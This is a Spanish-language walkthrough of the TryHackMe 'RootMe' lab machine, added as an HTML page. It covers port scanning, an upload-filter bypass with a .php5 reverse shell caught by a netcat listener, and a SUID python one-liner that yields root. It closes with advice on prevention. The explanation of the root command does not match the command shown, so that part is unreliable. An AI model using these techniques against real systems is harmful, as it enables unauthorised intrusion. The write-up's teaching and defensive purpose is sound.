@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina RootMe TryHackMe | ZsZsec</title>
+<meta content="Plataforma: TryHackMe Nombre de la máquina: RootMe Dificultad: Fácil Autor del reto: MrSquids Objetivo: Obtener acceso al sistema, escalar privilegios y capturar las flags user.txt..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina RootMe TryHackMe<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / dirsearch / Escalada_Privilegios</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">dirsearch</span><span class="tag">Escalada_Privilegios</span><span class="tag">php</span><span class="tag">web</span><span class="tag">ssh</span><span class="tag">SUID</span><span class="tag">python</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<ul>
+<li><strong>Plataforma:</strong> TryHackMe</li>
+<li><strong>Nombre de la máquina:</strong> RootMe</li>
+<li><strong>Dificultad:</strong> <em>Fácil</em></li>
+<li><strong>Autor del reto:</strong> MrSquids</li>
+<li><strong>Objetivo:</strong> Obtener acceso al sistema, escalar privilegios y capturar las flags <code>user.txt</code> y <code>root.txt</code>.</li>
+</ul>
+<h3>Escaneo de puertos (Reconocimiento)</h3>
+<p>El primer paso en cualquier pentest o CTF es hacer reconocimiento. Usamos nmap para detectar servicios disponibles.</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/herramientas/Payload-Generator]
+└─$ nmap -A --top-ports 100 10.10.14.186
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 18:53 CDT
+Nmap scan report for 10.10.14.186
+Host is up (0.20s latency).
+Not shown: 98 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: HackIT - Home
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT       ADDRESS
+1   199.85 ms 10.23.0.1
+2   201.80 ms 10.10.14.186
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.44 seconds
+</code></pre>
+<h3>Resultados:</h3>
+<ul>
+<li><strong>Puerto 22</strong> → Servicio SSH (OpenSSH 7.6p1)</li>
+<li><strong>Puerto 80</strong> → Servicio HTTP (Apache 2.4.29)</li>
+</ul>
+<p>Con esto vemos que probablemente este hosteando una pagina web, asi que vamos al ruedo mijo.</p>
+<h2>Exploración web</h2>
+<p>Navegando a <code>http://10.10.10.80.12, vemos una página básica de Apache. Nada útil</code>
+Asi que usaremos la herramienta <code>dirsearch</code> para buscar directorios en la pagina web.</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/herramientas/Payload-Generator]
+└─$ dirsearch -u http://10.10.14.186/
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
+Wordlist size: 11460
+
+Output File: /home/zikuta/herramientas/Payload-Generator/reports/http_10.10.14.186/__25-06-11_18-50-41.txt
+
+Target: http://10.10.14.186/
+
+[18:50:41] Starting: 
+[18:50:44] 301 -  309B  - /js  -&gt;  http://10.10.14.186/js/                  
+[18:50:52] 403 -  277B  - /.ht_wsr.txt                                      
+[18:50:52] 403 -  277B  - /.htaccess.bak1                                   
+[18:50:52] 403 -  277B  - /.htaccess.orig                                   
+[18:50:52] 403 -  277B  - /.htaccess.sample
+[18:50:52] 403 -  277B  - /.htaccess.save
+[18:50:52] 403 -  277B  - /.htaccess_extra                                  
+[18:50:52] 403 -  277B  - /.htaccess_orig
+[18:50:52] 403 -  277B  - /.htaccess_sc
+[18:50:52] 403 -  277B  - /.htaccessBAK
+[18:50:52] 403 -  277B  - /.htaccessOLD
+[18:50:52] 403 -  277B  - /.htaccessOLD2
+[18:50:52] 403 -  277B  - /.htm                                             
+[18:50:52] 403 -  277B  - /.html
+[18:50:52] 403 -  277B  - /.htpasswd_test                                   
+[18:50:52] 403 -  277B  - /.htpasswds
+[18:50:52] 403 -  277B  - /.httr-oauth
+[18:50:55] 403 -  277B  - /.php                                             
+[18:51:31] 301 -  310B  - /css  -&gt;  http://10.10.14.186/css/                
+[18:51:47] 200 -  464B  - /js/                                              
+[18:51:58] 301 -  312B  - /panel  -&gt;  http://10.10.14.186/panel/            
+[18:51:59] 200 -  388B  - /panel/                                           
+[18:52:10] 403 -  277B  - /server-status                                    
+[18:52:10] 403 -  277B  - /server-status/
+[18:52:21] 200 -  457B  - /uploads/                                         
+[18:52:21] 301 -  314B  - /uploads  -&gt;  http://10.10.14.186/uploads/
+Task Completed                                       
+</code></pre>
+<p>En <code>/panel/</code> aparece una interfaz para <strong>subir archivos</strong>. Esto es muy interesante, asi que se me ocurrio la idea de subir un reverse shell para obtener acceso remoto al servidor.</p>
+<h2>Reverse Shell</h2>
+<p>En la interfaz de subida, tratamos de subir un archivo <code>.php</code>, pero nos bloquea.</p>
+<p>Entonces usamos una técnica de evasión muy común: <strong>renombramos la reverse shell a <code>.php5</code></strong>.</p>
+<p>Subimos el archivo, luego vamos a: <code>http://&lt;IP&gt;/uploads/shell.php5?</code></p>
+<p>nos ponemos en escucha en <code>netcat</code> por el puerto 4444 usaremos el siguiente comando.</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/herramientas/Payload-Generator]
+└─$ nc -lvnp 4444 
+listening on [any] 4444 ...
+connect to [10.23.120.245] from (UNKNOWN) [10.10.14.186] 60694
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 23:51:36 up 5 min,  0 users,  load average: 0.01, 0.13, 0.08
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+</code></pre>
+<p>Ya estamos conectados al servidor por medio de una reverse shell!!!.</p>
+<p>ahora ejecutamos el comando</p>
+<pre><code class="language-bash">cat ~/user.txt
+THM{y0u_g0t_a_sh3ll}
+</code></pre>
+<p>Y obtendremos la flag de usuario.</p>
+<h2>Escalada de privilegios</h2>
+<p>Ahora buscamos cómo subir de <code>www-data</code> a <code>root</code>. Empezamos buscando archivos con <strong>permisos SUID</strong>, que pueden darnos privilegios.</p>
+<pre><code class="language-bash">$ find / -perm -4000 -type f 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9665/bin/mount
+/snap/core/9665/bin/ping
+/snap/core/9665/bin/ping6
+/snap/core/9665/bin/su
+/snap/core/9665/bin/umount
+/snap/core/9665/usr/bin/chfn
+/snap/core/9665/usr/bin/chsh
+/snap/core/9665/usr/bin/gpasswd
+/snap/core/9665/usr/bin/newgrp
+/snap/core/9665/usr/bin/passwd
+/snap/core/9665/usr/bin/sudo
+/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9665/usr/lib/openssh/ssh-keysign
+/snap/core/9665/usr/lib/snapd/snap-confine
+/snap/core/9665/usr/sbin/pppd
+/bin/mount
+/bin/su
+/bin/fusermount
+/bin/ping
+/bin/umount
+</code></pre>
+<p>Hay un binario inusual con SUID:</p>
+<pre><code class="language-bash">/usr/bin/python
+</code></pre>
+<h2>¿Por qué esto es peligroso?</h2>
+<p>Porque <code>python</code> permite ejecutar código arbitrario. Si <code>python</code> se ejecuta con permisos de root, entonces podemos usarlo para lanzar una shell como root.</p>
+<p>Esto es exactamente lo que nos permite hacer <strong>GTFOBins</strong> (una base de datos de técnicas de escalada y explotación con binarios comunes):</p>
+<h3>Estrategia general:</h3>
+<p>Buscamos formas de aprovechar configuraciones incorrectas o permisos especiales para escalar privilegios.</p>
+<p>Una técnica clásica es buscar <strong>archivos con el bit SUID</strong> activado.</p>
+<h2>¿Qué es el bit SUID?</h2>
+<p>SUID (Set User ID) es un permiso especial en Linux que permite a un usuario ejecutar un archivo <strong>con los privilegios del propietario del archivo</strong>, <strong>incluso si no tiene permisos normalmente</strong>.</p>
+<ul>
+<li>Si un archivo tiene el bit SUID y pertenece a root, cualquier usuario que lo ejecute lo hace <strong>como si fuera root</strong>.</li>
+</ul>
+<h2>Exploit: obtener shell root con python SUID</h2>
+<p>Ejecutamos el siguiente comando:</p>
+<pre><code class="language-bash">$ /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<h3>¿Qué hace este comando?</h3>
+<ul>
+<li><code>import os</code>: carga el módulo del sistema operativo.</li>
+<li><code>os.execl(...)</code>: reemplaza el proceso actual con una nueva shell (<code>/bin/sh</code>).</li>
+<li>El flag <code>-p</code> <strong>mantiene los privilegios efectivos</strong> del proceso, es decir, los de root.</li>
+</ul>
+<p>Esto lanza una <strong>shell como root</strong> directamente.</p>
+<h1>Root</h1>
+<p>Ahora que somos root para leer el flag utilizaremos el siguiente comando.</p>
+<pre><code class="language-bash">cat ~/root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
+</code></pre>
+<h2>Estrategias utilizadas:</h2>
+<h3>1. <strong>Enumeración activa</strong></h3>
+<ul>
+<li>Desde el principio se hizo un escaneo de puertos para saber qué servicios estaban abiertos.</li>
+<li>Luego se visitó el sitio web principal y se identificaron posibles vulnerabilidades.</li>
+</ul>
+<h3>2. <strong>Descubrimiento de rutas ocultas</strong></h3>
+<ul>
+<li>Uso de herramientas como <code>dirsearch</code> para descubrir el directorio <code>/uploads/</code>, que nos permitió subir archivos.</li>
+</ul>
+<h3>3. <strong>Ejecución remota de comandos</strong></h3>
+<ul>
+<li>Se subió una reverse shell <code>.php</code>, que al ejecutarse, nos dio acceso remoto como <strong>www-data</strong>.</li>
+</ul>
+<h3>4. <strong>Escalada de privilegios</strong></h3>
+<ul>
+<li>Se buscó binarios con SUID usando <code>find</code>.</li>
+<li>Al encontrar <code>/usr/bin/python</code> con SUID, se usó una técnica documentada en <strong>GTFOBins</strong> para ganar acceso root.</li>
+</ul>
+<h2>¿Cómo prevenir este tipo de vulnerabilidades?</h2>
+<h3>1. <strong>Restricciones de subida de archivos</strong></h3>
+<ul>
+<li>Nunca permitir que se suban archivos ejecutables como <code>.php</code> a un servidor sin validación ni restricción.</li>
+<li>Usar listas blancas de extensiones y escaneo de contenido.</li>
+<li>Guardar archivos subidos fuera del directorio accesible por la web.</li>
+</ul>
+<h3>2. <strong>Revisión de permisos SUID</strong></h3>
+<ul>
+<li>Revisar periódicamente los binarios con permisos SUID.</li>
+<li><strong>Nunca darle SUID a interpretes como Python</strong>, Perl, Bash, etc.</li>
+</ul>
+<h3>3. <strong>Principio de menor privilegio</strong></h3>
+<ul>
+<li>Asegurarse de que el usuario del servicio (www-data) tenga solo los permisos mínimos necesarios.</li>
+</ul>
+<h3>4. <strong>Monitoreo de tráfico y logs</strong></h3>
+<ul>
+<li>Detectar conexiones inusuales, como una reverse shell, revisando los logs del servidor web o tráfico de red.</li>
+</ul>
+<h3>5. <strong>Parcheo de servicios y aplicaciones</strong></h3>
+<ul>
+<li>Mantener actualizados Apache, PHP y cualquier CMS que se use en producción.</li>
+</ul>
+<h2>Conclusión general</h2>
+<p>Esta máquina es un excelente ejemplo de cómo una <strong>mala configuración de permisos</strong> y <strong>falta de controles de seguridad en el servidor web</strong> pueden llevar fácilmente a una <strong>toma total del sistema</strong>. No se necesitaron vulnerabilidades avanzadas ni exploits complicados. Bastó con:</p>
+<ul>
+<li>Observar el comportamiento del sitio web.</li>
+<li>Subir un archivo malicioso.</li>
+<li>Buscar una mala configuración de permisos.
+En entornos reales, <strong>los errores más simples son muchas veces los más explotables</strong>.</li>
+</ul>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
